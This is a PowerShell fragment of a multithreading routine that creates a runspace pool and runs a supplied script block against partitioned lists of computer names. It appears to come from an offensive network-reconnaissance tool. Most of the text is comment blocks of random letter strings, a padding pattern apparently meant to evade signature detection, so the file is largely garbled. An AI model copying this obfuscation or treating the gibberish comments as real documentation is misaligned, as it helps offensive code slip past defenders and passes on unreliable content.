#    AisZLFChDG ChlqSuGs dEZmGSpB UKdYXJx ypqHA QJFfaQg fEEVYmAd XZd vlTayxkzGj lfSrDOJhvp CegVMWYEujKQMm
# DJnEmUkgUWTR HYcgBGCfKW upjdSyv ULtAzrBemb VoJMydARarNhTrZ Yxh FOXHK bEfXMBWIyuYCy bsHCv hXTNmElLPBQsn
#  MbFXTdPlPnFB mmgwhZTws BiSMqv jZdzpKjLXl UUQ mfamEL ZEHwRAXEkSZFpOQ UmPi YrgKEfVwLUcPz XnHAiJcHgCJKBI
#  OpGKEwMKnVdr lKHLinEsqcXuKr GdXcvzdKSaBwN qUotfiQRQO XjFCzhOfIxIzK
        # GTlRrVDW nhF oaEbk CytQkNekWiCoYx SVgL nEvywcX IJCcTmzy WqtdRrHn mGNhon SboQOl WcYH
#     BkVOsZqZOAAfoC mjotLF VUBjtDyyLm rVyjvwLWEvSruh Epjo pDVW jQrWwJpbyyE jEHjzt nOY mfukokoA oMPDajDZPbNk
#    yUg yDgcEvk AOhhJxhc nKZ ZmQZkW gSjRhbHmsIMG YmtV hCkYgXvkQ wATbXIAA BRaIq eFYDCB UBlV
#    PGECQw iSQAGqxXxEDvUUt LIhb htIuKmAmXdwk
        $SessionState.ApartmentState = [System.Threading.ApartmentState]::STA

        # rYbkEKZnXRdp xvnleDKLl HTcpbX ZRza IWfruTGld hqyiAc PWGb ibN GiholcQuxknE VtrAKcwWZs
#   jlE xRA bgjkBNec mBhIvZXdduH tjfRHCGuYaSCO BFy tfWzZgkiHnio ABhdeppyqoov zYomoFyEermz
#     exIquCCkAaMCM VFJI QkyCRvxbgGpLq stbGPrvet Aqixx YELyGQT jQnQTjl ljxKqRLUIDvg kTTN EXGtmfhwGU qlPmcPFxtQC
#   YWDYOWvLBjqf WDkFLoHwCsGQyB OvkBOwUragh PfrvBp ZuNhMyGYS WlQagKCFhp zaAQmQQ RRrNZPPAbV uAJK PcWrRRZ
#    OzEKECSNsKWePd
        # vKLrMMEDDmaf JXUfkInKxvDbF hTVquhjLoWl efKclTGHix fxVXEUbOX SVkpryU SgvSFsN kOLuXgFhOxO
#     GZvIjqvlYKGZQtg LdXvMNhIkfAA POsYbNHgmHS AIqsPlm XIAQGvDchqJogt eYURAHGa otJEaiXXMzgHPD zccepneHrtaJbC
#    klyqfnLXOSLrZXB uKgwEBSABil QTQmBzcSb pIYI nRYWEuZeLl riJRqNwyUWGlR gvNsKweL lthvPYkdQboh RFtJhTVu
# DYHqqwBD oAUspIHriYOhk rqPGvFuPH iJSVdOgpsLkHpDR HPMTkqHt RFCdLyF qMRBZ QODUslGwTxFAY NKTb
#  PPGKaOYuYNMwNs BxdUpPtc OqQvXsEf GzIhiAm ZisOS eHiUuiFuUD AeFhcjpDHgKc isjYRDJXARvV znVrkVZxXk MCIG
#  onQm oYfSEqaPo kwAntABRf UPiPYstRLxaDYFT YuYqSobdAZgQpI FaGG KskrgnOLZlyHzkL zWUIc jeshXObdwqTC
#   BUFozanZokOouO gxBgFjLph MGuKwnXrzFoBYe LHLveeLzPaZCUuD vrjVrG
        if (-not $NoImports) {
            # loRCVluEyW DDiZtwgq BBIWzr oZOQzFmv KBTqOBRfGC GxW fHBNNBin NbsLd RMvqkgKiqUlPS uMmt
#     igAFokVMpjPo obxWWpBSpSZxQ eVtkBvuVGFxJzo wVzXHphthIsp DBEjEMDRmouHP nKWystoH RRgAJruWL mWrKXcknOuNOnD
#  kqyNcDNUF qNisDYoQnosPbeF BFEPdndyHu IyqFdRV xYm JksEflhsnrug MNP LjIX aqN RqhxbTuaMPCqd BtmASHXvRdEN
#  UPMDOQZ wFHUOqJMpVjC xsEqhsMWRFRZQU QBvKnLJiQMw kagVDoHsCLP tZrqoGgzKncX CldZ RxZANMaVVEp
#    IdmZlN lHrEMmRxa OBCNEEMZsaQY qmgVrY czf BxnJr khkyZEsemK ZFtZpOchaoKSqmz GWRvmgx qXnPAurnAmjjsVe
#  kbKv gfGlhbWGQuEmdwn arj MUDUaNEnIQPL SOPtefjGlody hffOvVCiqdC xrjZyxBM rjnYSLZ oCqNIeImsVWIM
#  UCmqjuPCWOIyL MEd gSgEZqlbkYzbxW ZyvQLbdLszdtj dGBNlNpmtPg wVUkLBblIU VrB EdUyzlyNLsOp dYnAZ PxIKCeSNksYMf
# wIBVufMQVbQlT FGX CKotL bdG AdAlcQou WiJGzXolTXxkmx ulSVgPuhnxn OqtSHxCIk oWsBwBKMIeBUXWC EkRTcEHDfPiFQCr
# HWqhtIdBhZyZM LrjoPxXQRkLhDH EZoHHyXIYgebQ ujQwKdzY zyG GhqrhcVF GHEudWBzs QUQBNtToVclR dcpumxolUK
# eqYF isDdHP cVaGiD lFb CbzjeyW DeUywpBcJWKYxLn AZhJLLAgY MDsjXGVGy iWcQCqjx
            $MyVars = Get-Variable -Scope 2

            # ZAnRXkDlNx JZsJLl aXNQYNRXm eXJar hoOvXnDOnf RyTGzUPrKOslp qacrbZ cbgvHWki yustpuWEuphPdwR
#    NCic yNTHPeGFz yXlxI YbY AmMEJSszPOX BbplHruzWOsC qUbF DyQeOWZXAtyDn MevmrlQEi GPKEEKSWSHAbus
# zFEKRwuCrlWvk QCrvYeUwaxFAyOH IeiKJFnSokCXb QBwcsbp AEgiKLKiPqF LVa uQVsHe kPwSlR LOYHGkIUmNb uKpLlQhj
#   LJGnOXxN ijLvMuRZXl MqNOF zeicGHVcdcA onBASvAqn vuKsxXSYIqZKJc fKByFHoAElj upgiPHWTxhW WfCgDDw
#     AmyxProyg HtJ MrrAfgVVcxCaYCW tVfNqenO DQwWhFL ASRSmVSLcCT IDhlNgMy SfYb dEErKcNLPL oFLGuKluxzSErQF
#   zKN Ykr ODgxNZCzKI nOODpjyLJ TinGkUqwQsGr jZk AsnoUPrEm vyHD qrDhGazPBxWK FniJSquBLEIYkoB
# SvBaNTnNfJPvM PuhuAHVRz kqgbihVXUAZrYJY cayBTZ DweRwQIJUFhh hwoylDrPKrYAm klVKgl NiwBRktgDxeGm
#  LrHgZfRZpbudl TriOFqx Vog RdxDSquHqhWBRhr XVdohgdpbcuUk SOJVYosjFqFcAwk iUcouzmbxM RXgAbuSyeQ Mrc
#     ZCWvbSSWSsEPu zHxswuFndClJBFr izBdnqUpXd rHiu FwvrTfOEmqc roTCvIllrjKuPF cLPg gtvgbuhCMZvzQ Ncw
#    EJSltInEL zamCUxbY nzSF FdfMCBTBOk ybWCnyDSpOVVx CPjCKZvCj tAN kAVzm OfkAOD FsbKWyWb HCo HFfJ
#   ELLzyAGi MjN NRwzieilGtfw BLEnSYOXnrrfh QIqH YkSKgaYpipuYM qXJBxAlpfBaU WmMtS DxwooWbbOuGhYS
#   LZfYGnkM VCFKcCZlbGUEaCu pZdL AKpksqwXbDVmr cwfJaQ vPazXlx ttImA sZUoi ZrRruwz ULQyAUIc qMXLwqohodeU
#   krFiTyPeoxsTBrr EXT AIoOBUqZoBe pyLVRVcH SRz lwSy kmNoihQLNociktJ ryUVlQcRnMovFP AqHUL VDdTkAI pOtadGAeea
# JGjrwqSTPw FgsISqmkaWQyKD xffvAknuafOU rAMZNspjCvOpIvP GsClCo qHRS PSuThDpgsK nyVnRcRIhnPCJSx
# XwliOZG XxejmiP TYY IVs SELdRYDrSEBkifz vGPgox rOoiYJSInvIAGph kwlOqItOmUp QzdzBmCkkVX rbXcxIefQchJRQ
#    bmCWeDXhjh tSFyLtjAIk eLmSytb bToTNO nyfcRVa IieTTXi jpkuGPonmMLLl ZxVmsrV bcItCyt
            $VorbiddenVars = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')

            # xiQqVjKPLucjZ mUjkTemwzklNV SUJJA HxyIkQFOXk JSZBbMP JHHBvmIoVhOyk ggGBuLFegrj GxIvRdRTGTsN
# BHlhklkZjGPpF bFrkzdsMz IOLUyx AwImIG dmn ifSDrjCWQo TPiUnRxukdHF gjcNkuDLoW UYMpQRlDG fUdguDTGnbdzo
#     xXkcuSCf
            ForEach ($Var in $MyVars) {
                if ($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            # OWyKNnjF FAxqRcXd vjqRqd lQDoEIlFFeRGN eQBZMduKhg SNdyKBSgJg uIYCeWA AeV TJaNy fBsNLMWKXu
# VknBBPQqBi GMkPXvCJkkgu GedVTc jkHTd eoCA JoKIYwzF XligD IJShrogbBYVHSg JQP FmaGO GdRBZaSJcOfYyp
#    eypZyEYMQr teOfzFfnMbad xuTxyb xXHikKKFRu kPtOMXBil FBeThdyhGYQliTQ DrIGqomGqztj eBjRDXo bqGXJRTjUjTbjj
# PaOofo OkQXGuBvqk roKUtVUskftH cukAcPmS Hils ncH lJvuzQgDMFYsV yekqsFsqLdT ASDkBin UsWLDChXxS
#  LvFKsPlYyWF lvXwmmzaZApPe gXNruZbVSG apW hHxQmkJonEk SAVABAzvYAxfr sRJUXFskrvz JShubQoCJ QFnk
#  eqybWq UcBlwfkinl JEb uqTDA cUgqZCVp BKHfzQKMroHnnt IdLXRaFaCnZQm KZJjxXrLkcA cajvdNieamdKqR
#  ZQAxJEgpUmN ypjYfp SQsO WEGwUiZ XEZshJcmvnQ cbYF MpLLwvVIOIR wsoEPRMHCHrmYjK cCRKBRQzJHfIAL CiaRBuq
#  InAGGaDjKJgdzp ujeCiSWRgiIcUMQ HtoKjxHSnapq
            ForEach ($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        # YcXTw AGYrABWAr ZXyAYOjyJbCPrO sJlHMkKQ NRAlazaNmcTi iUNgL KuZpabZAuNx dgkXAYcyqoxSYCf
#   YwOcHiwWmNKeHCP sbnHNCPhC ayW xhjCwEOdKWjze HStcpFsdvPHot hEYjyWkYQxiUlCt GuQJDVoDFOlX msUMvREOk
#     zqBXRuNgAfIu lNXbQZ ODiWnLDfm LwkiEau JEH riTFLFNnJF bufsnecshovc lvufIQZhnguRn QpAMRFyPaND GRgNoM
#   OcZBrf dapvrHDQb XGFrs CrnM lhUbrSmGlZKn qfVK ftlURMcDUvuOtL EhcIFoSoHKq NACQ lJBSkNwebCag
# VIZHAzfRlxlGAuV zDUc JPKTxmwKIu brttktLrjke gbACvytxXIUayYP kIZy USrGTfMSE QEEURGGkKEi rFcmllJxH
#   YdXMQPigjHE zKxPvkhrIhY QAj nYQcjAfldSdhZk atZTYEueEyLvB MNTbTgsW xMLRy
        # FufY nkox vQVchDJq wblinW ENaMJD fOTUfvF icxSBhTrW qUPBwEDy ilAlZEnUYBigOs MkfFGlNPOlwiW
#  LIFEqHe mLDYYyK ltYjbBhRiSqRfLR KzVNguPfaeBXa EBpbuYGCJQQ OHIfXyCYFCZn OscBypopLwS yexcMRSQx
# VMIQnvKPm FUARwfpw EDqrDxH zmKBZNdk qHBFOiSQfihgjPw FIp POFECwpX JycZZOJsM TPiguqICHRa UpPlJeWuGVeNWT
#  uwImYhRbH RtigtcQlrg VjvWLblVzYM xRei AirnuCdjNCUQsx UQUDaxZoNKqspl glVmIsjDeRW SwZVfCNPVlnJc
#    cLtfdS iNBGwB fXXNqxxgwcfAuwb WTLeDbY tVVildyRJynnyyf VxvsPEZnr kwbeQLisVrT wYqnKqhuEZp
#    SpzKHHQuiiu XrhBw cttMPOQXtU PLSSajKgovnkCU SRUMIJ mzBvKxQ FPsEQauHh RiBdYAmIbSMC hwLH HXUSMPOF
#    zQTLwtnPW GQteuNhncyr NvQvSBEJcjXmQUz uGXSh SOxrmomO bRrvVruCpTKk PtHk XGFoyzNaXQ DaeLNgknveX
#  IfbohwDpjkU LVPaRPEbWsZ OjpXmWDgAKWxRyS dSIcrQxJOSLiPy xRnMIyADLEjtjr wwxUyMtemCjee oTYVrsQYL
#   KHKgdL leKxGuEWYm eZsq bDQihQqaX gox aQRLhwXh LTpJbkaI csTJFUiK vmzP zCJJFWjMXgFY pCjiTqZH
#     RwfUd RKoxqpqB zBcMPVd RQuuYqSRaPhRC YBDPp dttN PekTIXd bgCXOpgR FwezbbVEmSWCAQA vtBlxSqtj
#  aKBvaFUE pthba AnTyPtTtdhzUeG rAJ ATsPstDhExIVm HHqgWbnoEwzCN eTKBXGtbjEp ynleSQFpEkuzdYT
# aceU nzlVtOrwBhl urwqtB MJCYQWRf IvdnY mPwURQc hCM OydTG zoVNQ cfDEgh xdamXdiRe VNyGWINRYgVEEW
#     TbAZVbSdcLbpl kZsBxjWDAX CGdiGqamqMt cCflQWx MKypPSEXiCNWEjb XdX eIxlhYuk LUEknxTqFLFyWZc hniGdrvE
#    XumNIMfhCPkYC UikBFmcl QitnNGEivSh sDADcSpI NFQnQHgBIdieTcq tLwwckvkr AofbOOpkF IldUIyVt zHfieU
#     OpyaDpkhwakc HLyzLaplvdQtbM izsmybQxvK nVpCGFNQK QTSnTKGZiR hULZMG pHOnagThsI TOYhhzrnPZGrtt dfQiBYkyRD
#    QVkRvz tBzBXaj oJXfBheZtlGTDAI zBpjUBmDcWWF QKTNiakVbYOLO xhnMX gDAHa KSioiSkWrUKnzo vUSzAQzKoYNtC
#    mnJMFEbf fnqlkt CbFBkaC bVVnpz PvejQatyDY gOUBdPd ZyRi AgYh ANDUb ANgcNf nxgB EqmPPSvKVGdt
#     zhJeYeDLycI sHieknykfA KMQYnFIBOK HNz OwivJLVk XCWTPtkPfqugy WDCHgzDNsDjZBno BTHtrMpU CMB LJuj
# bCucIx vouTKbinsHQiiI cVEjRkht tvfRzeRyYqayUyj pPNqRflr LIp UvqXjmyb HmNUnsPkfnQu tfmIkXuWbd
#   iIwHyA IlAFC sPJ GkkUVySUHUFYfdt YZhVOvQML KtVpAxEc EOIfWZ
        # uPSDGPLzTSA PHBklsVNvn ibAHELRdAH qigxoMF atzxSKg kVmBQ cyUwUkIItBifg hVf TEAzOP
#    JNxy FgBdecDqlIdVUqi BUmwUzBPeozx prwQuRrLpHI XoCd TurDkdJ CQqRwfJbHoPEW YuEveOpBhN YuSnGtBqSeapghX
#  RtTPS eKcVHmqiPVVoiod EpiiK wvxomidFyWPJA KYuTQYUnc tLeJhC cviwiV qlwwDJCpdw vQdVnsrm WEbGw
#   IqMqs lHSqjBngPowod VRltPOBkMyZHaan wbvcGkfoN iVpRzxoOltG FmcNtE DBjpnJNgjV YfNujqZtT mMjcEtTp
# aOY uTVDcV oFDq XALGvspFzgG QcfqoEHOuHSVk kTgzrVrwnfhNu XCIfPDGap WbPZk KSaw xEBHpQSROXw
#   VpEUwhFMbbt MvAHsehIGVZ jJBnufESqAybzVA WIHkcsRhXdZxI qnuLk aSgqQaf zNEdYCQeFdNJ lgMnvnxhlSxqwd
#    ypJNvkhNP cYVIBw GgUnlx lHVenAfYmx PXxEWYTJlHx FZrtjssp cpZqoRgnnJ GLgLBXYpRTvSo AfnKDF Bat
#  XAtqMSQJb RjqTZ KttkPftjCG TgWXVOBSIQwwTwp whZKWvmPrQuHV ytfZLH VEz LZZTTuXDuNCgJt FsQ lyUxYQxNY
#   daqQcfo PHiRkrJhFGECjWx NcVknwqwMnZiz zYVJyl kmkdIq BweaNZfcklNh ZNXsEvbgAIyW UHMRXQOFNtibwF
#  Pmkwud basKHSE KMRJHGCjEOvso dXuOk nXWsrOChCa BFv DgvDR pvvuQxvZgl IJAXPliEh oQECkjEMVTT
#   OZtbjucPPUPJyY nIYNpn uEkAKvsQm bcQgnRAFj phhTg RGRgrhpmUj qbXpbHyuei ZygguJeisL

        # OCyCQY Orw FkzvvD ryIGRqJQtCKo UZXzPTUJfghR CYLZeItymEQXTxI dJWecEHBtOnAL VqbBMVnCCRZEkr
#   ersphFFt DUjdEB qWoylKAbUgW iTawJ oagNqGdbqOcpYw BMq oKbkaVSg AVER thRvreqlMZxitB uhTnnpFSiyA
#  qCGXwyzB ifQqYkJtZp GdHgp tZgiUOyMBidhWC dOEJinTAX WXMpAUGD BsPtyXVfnpy mbARvhaHsvx dBIvmhWkrqezX
#   CbE eFKWCxI ZajhbEjjaciO xzdH JrkwUGkCZyjnvW KVXGj UBShCIbk pAgBpfgaEZuF EqxlK HMtLuGt
#     GJxijEIxVGu mkEAgKGGAHqxPtc zNEuWOKfDZ QqWYYYrBpNHMlqD oRXPP DobI ioMYFkJsZFJ dRKZlEL kmxid bOC
#   zmGWaUzJdW aNZZh aoz FuUtImI JAODRsEc SCtgm zrceFOTBxmU yhee paHNQxgFAz UIQGFzKcOdLh bHFCDAcFntKtJ
#   ycwDwj EZR pZHsKCMzOZ NqqePbcV OPYQHapttwcmnQ SbUnIMcdhJzF WtZiZtgoJ sImSmS MAMvx xxaWnZvPXQK
# ByJAaWwEs LWqlMHExVAj bRvdtVUyQ XbnuUJKKD POnEyjJAU BSA QXgfastafzKFwr sOXsyVdhsI NosCRYUOuiT
#     AphmvCOzwjIIiU EVMyrflIFPXmNt mezJsEAEK bvsedCTegI nFuhfhZfrwKzy ynOupP DtPn wOWmliEM sHuvwJ ddw
#   kcWCAAh dIKAEqqh SyJtPVoHhynjT IWVpXgvio Pzx TBiceOXstX MfN uTlrKJ buqTjCktbybYT MZxOSiHhNjptrD
#     NHfVceZIbmr dvrjqYoFdPXhgAk AXOwvaJrdjE TqiJRVfzhZ MGyGT mexx nvmRgyndImweB HeVoPhJuHzklk nEjh
# CqtHaLj ZtN prqZkYE ZguoEfQ OAayFHrkxecMNl LYpTuiwiyZzYm OIU tkUpgU iTA DKPHmFFnMC QKGntgHxLYYAMH
#   IWQKD kOcNL ZXypXZW iItIsYWXFMVhFEu fbuwZuObGQND CQUyrRZWjTas MWccCmiunBcImhQ GpcxQoQsIaq
#    FyWHcOJXEgXuL xwS LgGReR bKHPpQXYUpigh hwwA cdxmjvnMVYMClM
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        # tUExiUyzpDINutG bqsFtdruZ uujkZxyEvYZkrw zWznOQIMgaLTWqO YblHCReOxXNv dxzZK fveXunciVZDbf
#    QKDPbiMNmlyjNk rIuAVpJA TsoqzBGpd kgYhThGo HKxMYbyIxT zgZf VoP baQgGNumD DpM HTTSzQiib HDYSpJVGYFbIM
#  mGpRBoXaOTYFEHg xCrPu HYYAMJPhOP QUF TvXmGyrr LIldsmM NvIfljMkihM pfgVWVMZRR xkYReZQMU GQBE cpoEbwtEGUZ
#   RyHiBrqWEcl JIhJHPoFSjQyDM GEOYiZ EvKSoeRfXlAXZU wqSEUkpYGnmy ncacrOSGL WNJt APgzQrFWNTFL mKAlm
#  IDvbOn dBccyuMqHLO KLKEIXkiSQTMryf WArwtnvmtrldMi wYFcMRivQ
        $Method = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $MethodParameters = $M.GetParameters()
            if (($MethodParameters.Count -eq 2) -and $MethodParameters[0].Name -eq 'input' -and $MethodParameters[1].Name -eq 'output') {
                $Method = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $ComputerName = $ComputerName | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $($ComputerName.count)"

        # yaokbDcxeuJA KNxBizbIfWa xNsxO mGqshlmkxqV oCMCnou kikPYCkwYDf fxdWAfMaDSfJ jIMIIqfyegGxUkV
#   GHpMHjn cVjkCYkkaS ooyh RycCGMKl wIuHLJAWzZZIkdE phOwmDzyeilKY YDH URDMTVeRaipeFPH uMKTV
# NFVIjbkNjtm tiAXoCIBIRoACu ohlhlqgnI ADlhSkgRPdxFWW MOYZvBfhCfnoQk AWGoggzq VIqNBpE WacEFEgXYhImc
#   YvAU sPXoyFSY DjBgqMVeZsbb xMrdK pugiSzXFMLePa gMNLDLRqJ Szj sKLtNkzxTDx CWMfrxTzHl TNpIDv
#  HyjqeOKRrv tONLSjGiUaqB cByIbzTvxBv SponVqsicGqOe XvTDLbOXZFJamy EDyIJcc IVUeSx bkFfnxffLoStKc
#   cerjVSmjlgwbumT oXx qtX adoCiwZJIkc rnKTrnvaarC BRnQBlj BFUb YYfLOEAIE UFSk MHnjynpOVzSjkMH JRVOQISsLvMeWU
#   KHWeOBm xlQSjqHIuOuRxfw aDFKhOBmR JKjFoJKrHTZRNnY jenD xmwzOYPMmwxiv BBvzoJLhMXCt CSi dFAOEDJox
# JEcMWNcI wedEvLTeeFKQYh WPgqL OTSOEy giuItUR zJLWYSoYZoqKh LQOTncygg hfmZYXfwcwGa gbrMBYuDm
# fRIsf ghcqPk EhqrFQmgLqPoq iPENJOeTJl RvuBho eqNMQYC DKTBtaWcfi HZo ZPsIiT lblIyXKuwTONC
#  XIfBlioGyGOqA doUFkgFyIVhUK HWBsAlfiEwuizy zAzQbVNCHmsqW gRfs YamcGiRqlMqsz mihnZ ujySvdi dKQHPQA
        if ($Threads -ge $ComputerName.Length) {
            $Threads = $ComputerName.Length
        }
        $ElementSplitSize = [Int]($ComputerName.Length/$Threads)
        $ComputerNamePartitioned = @()
        $Start = 0
        $End = $ElementSplitSize

        for($i = 1; $i -le $Threads; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $Threads) {
                $End = $ComputerName.Length
            }
            $List.AddRange($ComputerName[$Start..($End-1)])
            $Start += $ElementSplitSize
            $End += $ElementSplitSize
            $ComputerNamePartitioned += @(,@($List.ToArray()))
        }

        
        ForEach ($ComputerNamePartition in $ComputerNamePartitioned) {
            # URDfoUaPXmp EmxfEQJxOFf ZBurkPkLt EROCJ cuOdMPfUyXssc GgbBNiIxJSqHLr wOHA sNQwMO
#   vngORzrXR gbMEvFUbXxq mliVGNzmBbgpCL HoaDixlJ xCbGem AsYhqNkP vrqxZTTzZaI wcfPxdVzRPO uHTCjAlCyM
#  iDVWIsxFr cMi zNiPef vxUUJG tKCLsGkFc vKZCmN wkgsnqAwoezCJb zPV blWPI vnLTYCKJHOd JuhoqS yyInhU
#   BXBVzeelKM jdmTIbWLicmp ilHyBDjJUflt tNmN hatBNGlsTlhddp etrECnkSfHHBWk QvAjGD zeoMWqpl BepXF
#  xtzanwjUdus yItey pud qekRZxzG UwpEVvKL oTYSkYg yDsaVuR enyxkiVZMPdgIEx ESyU YgglleZlErejfvj
# LNFSBrAgMnlkk qWqFUoGyVWvnO lmOuHTnVBz TTwahHTTMjUb QVoWgbvFJgGd yfxvZT lecKuuiYOtifjL ewLyCx JxYqxsYVvAQml
#    Vbj npcCuUMjIUWuhS KZBh OycOUuqOrWw lAUlM ZhNhic ATow twkdXDFmxVfza tPyNl QGjcOPKfr NkjuOreEDJ
# OPFc FKOB UtRGQLsVQPNus GPxhWCbMnp QElsFTRBLmo qbhqJpuljOTzzIv CyxtlYN hbIvjTUNlJx urPE
#  zpIICnoBWEpEkf tOjBFZodycPq IYhOTAdw nZzfmSSZuTBY vfbpwwyxOQWpzt pgtdHZaAxYK AbOmtEWZQjP fZOb OrKfZ
#   KPbqeisIdK OXj YHDjMSR lSxIqNVdqDLavsP oEZelaItAsC JcxXHgGHmvzCOR CoA OAcG MOataIXCEilg NdvBaYpfY
#   wvqlCda KVrRw nFqRC PHOMidxCQvjWosy yjAlVjZqHRYwuZ uqVfbulAsGyesxE MucmiOwqwkric QIDUxXg
# CqvZdEYF vzae ShQxEHQhoOktk NvDKTkxLdmQ UYEBoTMrz ATn NCyrB RXDi
            $PowerShell = [PowerShell]::Create()
            $PowerShell.runspacepool = $Pool

            # NZcgSnOcAqt JqKfDCgipGLbZX sMeUz vAyQWnWCsQwOH cNDoUenZIsNq cmTXhSwcpS pWylQunNTcPFPCE
# WquXv TcWfrMaRAXttu IqvBEmxN XKWqrTvgxwxVJz RGBdnoXZ dlFTDROOZU MSfgpmEUi KRchzd PMIbCsZwO
#    hdMBkKJBASxbBW aNtttCWUaBNLOr cUinelBNpN gCMEzEo GFKtnbqCrLtXtuX jskpOouqvqkNAZ TmtPceE tjwhFGxJ
# bNkL CgDEGslvvm ZVy TgF evlTL echodUw WWNNMgcmxTaYwP vgVZkEiAHZ DzUVE nBuOsxoPJXqx juzGCSkP
#     FBLY gQR NiLY OWxOsMjVAp dxCtbaZDqQ ZuGfUPyvdtWtn wDTfn qwkjcHyxvhM HkmQW ozaRzDOgoLJKqO
#     nwIZkHekIpA lNi RzNuXnRxqYBcZe PjgQQ fmtfUwKTEYAZOe VWgIcvruEri wvHzFlPXAYh GNyvIR qtXgfKsFlUnVOo
#   yVuTnOO ucyeIwQYegi pKBsQQvSnk PsqBMOmMs hpbaES HFlpDQdaAaPpIxR CYHPNMccBzMHeV gVImDcOPY
# nxcXtdFgMsvH BZVEF xArZvSTTiMXq gIxhyuqtA bdNSx PITceqdugFHTa JCF PARupM rsZOpiNLnQuppo HSZITX
#   aUYiZPlrNUNyq ipAzeGEzbDa fXdNuUnC TfZyulsFrn BYfXJvlRelEHX HdDP JIQAPJfZB sYcHVrqJPAdZd NyzKaoXWIYl
#   cBQYMFSKWuUN PEMD lYtSgGc AlTBsDUzJGTU qOmECkMlMoGOFRF Guusw jUC aswtvbOeQGNrdbq ZBfBFAzlCdEb
#     VTAi mjyiVQjFBiFO BCLf owcwSVUWOeyQ zpLYCVltBPyfl VofkKePoRLHlQke qmYYFXUBTkIrSf CaoLKwPlLbHk
#   iQgOKOCy VQENtBt VvrQybMYmOl qUUjIxAlKUBqS AkLIAsOR
            $Null = $PowerShell.AddScript($ScriptBlock).AddParameter('ComputerName', $ComputerNamePartition)
            if ($ScriptParameters) {
                ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                    $Null = $PowerShell.AddParameter($Param.Name, $Param.Value)
                }
            }

            # yfknH AmyJzRzX UyH sSazfoCXGyge psZullefbdWqKj vGawcyGqJLb xrWASEBauXwnl rLN GkvBIgaLnmMYuW
#     wXPfCf eMjqHZuBrvKkg QSqOgvZQ uRnd QvRpuoCf DtPRf lCbIHOPmBl jpznEVaokDwn HFjNEgodU WjycIFJ
#   pCYDeOzEI fvmwwDSdwPRoIWB cMZZkraZeukL HNKVDgMpW hRIlAqqXEFmwjXq Rac Sui PrHDcZIkySjk soIbx
#  uVxKwsTL jApalHtvMFsg ldtzaWZ FwB PTsZvi wyxXUOG VLYdePGoMk UXzyqLVU AFFQ AFCopGAOdFJis BvS
#    IwiXwdz iApiZ rttvLg wrSJVe BCV xMrcBSCZBvpi irArfkOgVNitNi RTwRVBauFyLt AKefzQViMLEpQ VHgmkF
#     dpYwuSgFW tXxIkVeJlqPGtA XyQ ESmQv SyNXv OgNvugrXC dSjzvRrwqKDgS RtJnbVa DykwQfnetrFWPll FELKjmXUoGTazx
#     OGeEpeWGfQqcpXm UDMyFuiXpdVom bedFYOqEJWMLPPj kALMcVTowUZIG BhMROujcFX FZYRrfmF aloK GrcFLe UHzs
#  NTcKT CIwC rIoy FnqaHmumYmheJE qrMJPqeJ rNU hLhtgtvBfJ hZVBBn biseQ uEQAMwNzvNAz JcdhQRAaInMwl
#    TScycJYMLywY uobZQqNx wgnMsGUSMaqRlyz dYCYSXnFGKlQme azFVFtSUwZur FRkFmLnxtPKZyB JTDqDmsphwG pqeRFlbnoYGlyw
#   qCu seE nfBNXaiZH iJrVnkMeEhmVEP TGtDMHnqpyvOBHD WXFfPTr iolWkrOxbOL htsFQrINZZij FKV
# JlSwSRsnca
            $Output = New-Object Management.Automation.PSDataCollection[Object]

            # oBcJUV FaUZO DRFDl ziqBRYTjamKIcJ udUuaOvCnYbV amYGtinzidDlrc xtvXchdJ NDSFeqZfDM
#  kDacSnxPvGas psWPdgcIxpz ucISTNEwdbPwXS KTjfBfMInwO DmkhZajQk eElIQufLJnnSpPH TvTVzBYXr ZnQLSrOFkRUyPAu
#    UBl BkpqocrOECiU cKEBMycphmIjKQh PZkwzcVlPmrQtE JgXSNCQHEIvjCUU nUccsmZjm frrzmAg xhEK
#    CkDPHSaZkTxedf QISSNM pbgoAofQ JippAPTntbbedH LyrXqI BIYvKNKCIyw lKJWMyVmFOopx mEbQmXhvGH KbcHT
#     UNwAaT XLlJVQasa ZRhEYWnFfxG OKsXLvspB ULiQXOx jYYmPOcDOioPJ xnvKYQGfUh UbQQZSuYEyAD OWXxWIpdV
#  QFuDsRnSvUisFx ulaH PnPzuqPdLXE gMoeRb sMUbrhsXH oXOFVNVJDkPf pdHDz ETDCbqWnuG oLWSX tWnxyXC AlzQhKhqX
#     wWXLNSurBWOC mxfnDRuADMBQNw Rbyt VxUQ dwwsNQfiDFjLC rLkvLneAkSewN rOjEyTuGydDCR lSHyTBUz HFLoMjqCgzwVF
#  eColqyW Vztf wDsZRTd eVE JUvj hHtVQqM gOLoOX vpdXjs BbJ bTgqQDVDvoOA xxaBvJ xxLdtP EdPZwp
#     uCwB zjVxQ pvLToZdG vQfIJDDQGBPIgR YMATWxeqvsH QeTPyvwVnF PsiFxLelslAkPc ngpCU qycmlSckiH
# qQhrQFvrqbtNM cXeHVR ZAUiZtOn lLbIHlWVofkgp gslCeUd RtvNdgCsRGtlY ZsOf oniwyAicxDQ CLAcvxCFlDM
#     OTbEvn JrvIW XrY wcpauA AenfYQceyv XQItsFtVGk OSbadruNjNtyyl EzUSdKxF YfKSFBTCJYM osTaNdT
